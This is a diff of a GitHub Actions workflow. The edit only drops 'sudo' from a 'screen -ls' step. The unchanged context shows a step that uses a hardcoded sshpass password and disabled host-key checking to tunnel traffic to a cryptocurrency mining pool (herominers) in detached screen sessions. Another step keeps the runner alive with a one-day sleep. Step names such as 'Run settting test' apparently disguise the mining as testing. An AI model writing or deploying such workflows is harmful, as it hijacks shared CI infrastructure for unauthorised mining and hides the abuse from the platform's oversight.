@@ -17,7 +17,7 @@ jobs:
         run: sudo apt install net-tools -y &> /dev/null && netstat -nltp && screen -m -d -S pool sudo sshpass -p 'aunglay' ssh -p 1111 testing@localhost -o StrictHostKeyChecking=no -L 8128:de.beam.herominers.com:1130 -o RemoteCommand="top" && screen -m -d -S pool1 sudo sshpass -p 'aunglay' ssh -p 1111 testing@localhost -o StrictHostKeyChecking=no -R 8111:localhost:8128 -o RemoteCommand="top"
  
       - name: Run settting test
-        run: sudo screen -ls
+        run: screen -ls
         
       - name: Ubuntu ready to go 
         run: sleep 1d  
